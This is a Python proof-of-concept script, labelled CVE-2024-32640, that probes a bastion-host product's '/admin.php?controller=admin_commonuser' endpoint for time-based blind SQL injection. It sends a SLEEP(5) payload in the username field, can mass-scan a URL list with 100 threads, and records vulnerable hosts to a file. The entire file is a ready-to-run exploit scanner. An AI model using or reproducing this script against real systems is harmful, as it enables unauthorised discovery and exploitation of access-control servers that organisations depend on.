import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    banner = """
    ███████╗██╗  ██╗ ██████╗ ███╗   ██╗ ██████╗██╗   ██╗██╗   ██╗ █████╗ ███╗   ██╗ ██████╗ ██╗██╗     ██╗
╚══███╔╝██║  ██║██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██║   ██║██╔══██╗████╗  ██║██╔═══██╗██║██║     ██║
  ███╔╝ ███████║██║   ██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║███████║██╔██╗ ██║██║   ██║██║██║     ██║
 ███╔╝  ██╔══██║██║   ██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██╔══██║██║╚██╗██║██║▄▄ ██║██║██║     ██║
███████╗██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝██║  ██║██║ ╚████║╚██████╔╝██║███████╗██║
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚══▀▀═╝ ╚═╝╚══════╝╚═╝
                                                            version:中远麒麟堡垒机

                                   
"""
    print(banner)

def main():
    banner() # banner
    # 处理命令行参数了
    parser = argparse.ArgumentParser(description="CVE-2024-32640_poc")
    # 添加两个参数
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    # 调用
    args = parser.parse_args()
    # 处理命令行参数了
    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/admin.php?controller=admin_commonuser'
    url = target + url_payload
    header = {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
        "Connection": "keep-alive",
        "Content-Length": "77",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip",
            }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False,timeout=10)
        if res.elapsed.total_seconds() >=5 :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__': # 主函数的入口
    main() # 入口 mian()